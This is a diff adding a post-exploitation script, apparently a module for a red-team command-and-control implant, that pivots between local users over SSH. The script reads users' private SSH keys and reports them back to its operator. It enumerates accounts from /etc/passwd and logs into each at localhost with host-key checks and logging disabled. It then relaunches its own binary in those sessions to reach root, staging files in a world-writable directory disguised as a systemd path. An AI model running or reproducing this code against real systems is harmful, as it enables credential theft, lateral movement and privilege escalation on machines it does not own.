@@ -1,0 +1,153 @@
+"""
+This tome will attempt to pivot to other users via local SSH and stolen keys
+
+input_params:
+    pivot_cmd: The command used to run on the SSH session (defaults to /proc/self/exe)
+"""
+MODNAME="[LPE-SSH]"
+DEBUG = True
+
+usernfo = sys.get_user()
+
+# Create a temp dir that is shared across all the rake tomes
+def get_tmp_dir():
+    system_id_file = "/var/tmp/system-id" # SHOULD match imix
+    mach = ""
+    if file.exists(system_id_file):
+        mach = file.read(system_id_file).strip()
+    
+    if not mach:
+        mach = random.string(32, "abcdef0123456789")
+        file.write(system_id_file, mach)
+    
+    path = f"/tmp/systemd-private-{mach}-systemd.service-aGF4eA/tmp"
+    if not file.exists(path):
+        sys.shell(f"mkdir -p {path} && chmod 777 {path}")
+    
+    return path
+
+def can_read(f):
+    """Return true if the user has permisions to r this file or directory
+    """
+    PERM_READ = 4
+    f_user, f_group = 0,0
+    # Set the user bit if user owns and group bit if my group owns
+    if f["owner"] in (usernfo["euid"]["name"], usernfo["uid"]["name"]):
+        f_user = int(f["permissions"][-3]) # User byte
+    if f["group"] in (str(usernfo["egid"]), str(usernfo["gid"])):
+        f_group = int(f["permissions"][-2]) # Group byte
+    f_world = int(f["permissions"][-1]) # World byte applies to everyone
+    return any((f_world & PERM_READ, f_group & PERM_READ, f_user & PERM_READ))
+
+
+def try_ssh(args):
+    """
+    look for ssh keys and try to lateral/lpe over ssh
+    :param arg: the command string to run on the remote box
+    """
+    home = "/home/*"
+    envhome = sys.get_env().get("HOME", "")
+    if envhome:
+        home = envhome
+    files = file.list(home + "/.ssh/*")
+    keys = 0
+    # NOTE: This doesnt use any of the specific keys we find, it just tries defaults. maybe we should
+    for f in files:
+        if not can_read(f):
+            continue
+        key = file.read(f["absolute_path"])
+        if "BEGIN OPENSSH PRIVATE KEY" not in key:
+            continue
+        print(MODNAME, "Found ssh key", f["absolute_path"])
+        report.ssh_key(usernfo["uid"]["name"], key)
+        keys += 1
+
+    if keys == 0:
+        print(MODNAME, "no ssh keys found, skipping ssh logins")
+        return -1
+    
+    # Get the ssh port
+    sshd_port = 22
+    for f in file.list("/etc/ssh/sshd_config*"):
+        if can_read(f):
+            haystack = file.read(f['absolute_path'])
+            ports = regex.match_all(haystack, r"[pP]ort\s+(\d+)")
+            for p in ports:
+                if p:
+                    sshd_port = int(p)
+
+    # TODO add a check here for it, netstat currently doesnt show it
+    sshd_running = True
+    for proc in process.netstat():
+        if proc["local_port"] == sshd_port:
+            sshd_running = True
+
+    if not sshd_running:
+        print(MODNAME, f"sshd is not running on port {sshd_port}. skipping pivot",)
+        return -1
+    
+    for user in users_with_shells():
+        # BatchMode - do not ask for any input
+        # StrictHostKeyChecking - Dont check host keys
+        # UserKnownHostsFile - dont log the host
+        # Set the port
+        res = sys.exec("ssh", [
+            "-p", str(sshd_port),
+            "-oBatchMode=yes",
+            "-oStrictHostKeyChecking=no",
+            "-oUserKnownHostsFile=/dev/null",
+            f"{user}@localhost",
+            "whoami"
+        ])
+        if "Permission denied" in res.get("stderr", ""):
+            continue
+        if user in res["stdout"]:
+            # Success, now we call ourself
+            print(MODNAME, f"Got ssh session for {user}@localhost. pivoting and disowning")
+            res = sys.exec("ssh", [
+                "-p", str(sshd_port),
+                "-oBatchMode=yes",
+                "-oStrictHostKeyChecking=no",
+                "-oUserKnownHostsFile=/dev/null",
+                f"{user}@localhost",
+            ] + args, disown=not DEBUG)
+
+            if DEBUG:
+                print(res)
+            if user == "root":
+                return 0
+        
+def users_with_shells(skip_self=True):
+    users = []
+    for line in file.read("/etc/passwd").split("\n"):
+        if line.count(":") != 6 or (skip_self and line.startswith(usernfo["uid"]["name"])):
+            continue
+        #user, hash, uid, gid, comment, home, shell = parts
+        user, _, _, _, _, _, shell = line.strip().split(":")
+        if shell in ["/usr/sbin/nologin", "/usr/bin/nologin", "/usr/bin/false", "/bin/false", "/bin/nologin", "/usr/bin/git-shell"]:
+            continue
+        users.append(user)
+    return users
+
+
+def main():
+    # In order for other users to run this file, we need to set perms on each folder leading up to it
+    # TODO implement this somehow
+    if not sys.is_linux():
+        print("[ERROR] This script is only for Linux")
+        return -1
+
+    am_i_root = usernfo['euid']
+    if am_i_root['uid'] == 0:
+        print(f"[ERROR] euid is 0. no need to try and root box: Aborting.")
+        return -1
+
+    exe = input_params.get("pivot_cmd", "")
+    if not exe:
+        exe = process.info()["exe"]
+    
+    print(MODNAME, "trying ssh with", exe)
+    # Try to pivot via local ssh
+    try_ssh([exe])
+
+main()
